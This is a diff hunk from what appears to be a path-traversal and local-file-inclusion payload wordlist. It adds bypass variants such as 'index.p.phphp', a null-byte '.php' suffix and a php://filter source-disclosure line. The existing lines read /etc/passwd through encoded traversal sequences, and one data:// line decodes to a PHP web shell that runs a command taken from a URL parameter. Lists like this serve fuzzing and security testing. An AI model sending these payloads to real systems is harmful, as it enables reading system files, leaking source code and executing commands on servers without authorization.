@@ -25,7 +25,9 @@
 ..///////..////..//////etc/passwd
 /%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
 %00../../../../../../etc/passwd
+/../../../../../../../../../../../var/www/html/index.p.phphp
 /../../../../../../../../../../../etc/passwd%00.jpg
+/../../../../../../../../../../../etc/passwd%00.php
 /../../../../../../../../../../../etc/passwd%00.html
 /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
@@ -49,6 +51,7 @@
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 expect://id
 php://filter/read=convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=index.p.phphp
 \..\..\..\..\..\..\..\..\..\..\etc\passwd
 ..././..././..././..././etc/paswd
 ..\..\..\..\..\..\..\..\..\..\etc\passwd
